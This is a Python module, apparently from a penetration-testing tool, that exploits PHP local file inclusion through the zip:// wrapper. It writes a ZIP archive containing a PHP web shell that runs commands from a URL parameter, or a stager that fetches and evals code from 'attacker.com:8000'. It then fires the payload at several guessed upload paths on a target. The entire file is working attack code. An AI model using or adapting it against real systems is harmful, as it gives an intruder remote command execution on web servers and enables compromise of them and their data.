import os
import zipfile
import tempfile
from .Detection import Detection
from .utils import attack, cook, parse_headers, parse_post_data
from .rich_output import colors, print_error, print_success, print_info


class ZipWrapper:
    def __init__(self, args):
        self.target = args.url
        self.cookies = args.cookies
        self.detection = args.detection
        self.nostager = getattr(args, "nostager", False)
        self.method = getattr(args, "method", "GET")
        self.custom_headers = parse_headers(getattr(args, "headers", None))
        self.post_data = parse_post_data(getattr(args, "post_data", None))

    def create_malicious_zip(self, payload):
        """Create a ZIP file containing malicious PHP code"""
        temp_dir = tempfile.mkdtemp()
        php_file = os.path.join(temp_dir, "code.php")
        zip_file = os.path.join(temp_dir, "malicious.zip")

        # Write PHP payload to file
        with open(php_file, "w") as f:
            f.write(payload)

        # Create ZIP file
        with zipfile.ZipFile(zip_file, "w") as zf:
            zf.write(php_file, "code.php")

        return zip_file, temp_dir

    def attack(self, zip_path, php_filename="code.php"):
        """Attack using ZIP wrapper technique"""
        payload = f"zip://{zip_path}#{php_filename}"
        cookies = cook(self.cookies) if self.cookies else None

        response = attack(
            self.target,
            payload,
            cookies=cookies,
            detection_mode=self.detection,
            method=self.method,
            post_data=self.post_data,
            custom_headers=self.custom_headers,
        )
        return response

    def execute_zip_wrapper(self):
        if self.detection:
            detector = Detection(self)
            detector.detect()
            return

        print(colors("[~] Testing with ZIP wrapper technique", 93))

        if self.nostager:
            payload = "<?php system($_GET['cmd']); ?>"
        else:
            payload = "<?php eval(file_get_contents('http://attacker.com:8000/shell.php')); ?>"

        try:
            # Create malicious ZIP file
            zip_path, temp_dir = self.create_malicious_zip(payload)
            print(colors(f"[+] Created malicious ZIP: {zip_path}", 92))

            # Test different ZIP file locations that might be writable/accessible
            test_locations = [
                f"/tmp/uploads/{os.path.basename(zip_path)}",
                f"/var/www/uploads/{os.path.basename(zip_path)}",
                f"uploads/{os.path.basename(zip_path)}",
                zip_path,  # Direct path
            ]

            for location in test_locations:
                print(colors(f"[~] Testing ZIP location: {location}", 94))
                response = self.attack(location)

                if response and response.status_code == 200:
                    if "<?php" not in response.text and "eval" not in response.text:
                        print(
                            colors(
                                f"[+] ZIP wrapper exploitation successful at: {location}",
                                92,
                            )
                        )
                        if not self.nostager:
                            print(
                                colors(
                                    "[!] Start your listener and refresh browser", 91
                                )
                            )
                        else:
                            print(colors("[!] Try: ?cmd=id in your browser", 91))
                        return

        except Exception as e:
            print(colors(f"[!] ZIP wrapper error: {e}", 91))
        finally:
            # Cleanup
            if "temp_dir" in locals():
                import shutil

                shutil.rmtree(temp_dir, ignore_errors=True)

        print(colors("[-] ZIP wrapper technique failed", 91))
